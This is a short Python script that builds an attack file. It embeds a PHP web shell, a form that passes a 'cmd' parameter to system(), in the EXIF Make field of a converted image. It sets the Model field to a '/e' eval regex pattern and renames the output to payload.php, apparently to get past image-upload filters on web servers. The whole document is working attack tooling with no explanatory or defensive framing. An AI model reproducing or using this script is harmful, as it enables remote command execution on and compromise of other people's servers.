import piexif, os
from PIL import Image

path = input('path to image: ')

im = Image.open(path)
rgbim = im.convert('RGB')
rgbim.save(path + '.jpg')

payload = input('payload must be php file, default payload= keep it empty: ')
if payload == "":
    payload = "<html><body><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?></pre></body><script>document.getElementById(\"cmd\").focus();</script></html>"
else: payload = open(payload).read()

img = Image.open(path + '.jpg')

rgb_im = img.convert('RGB')
exif_dict = piexif.load(path + '.jpg')

exif_dict['0th'][piexif.ImageIFD.Model] = '/.*/e'
exif_dict['0th'][piexif.ImageIFD.Make] = payload
exif_bytes = piexif.dump(exif_dict)
rgb_im.save('payload.jpg', exif=exif_bytes)
os.rename('payload.jpg', 'payload.php')
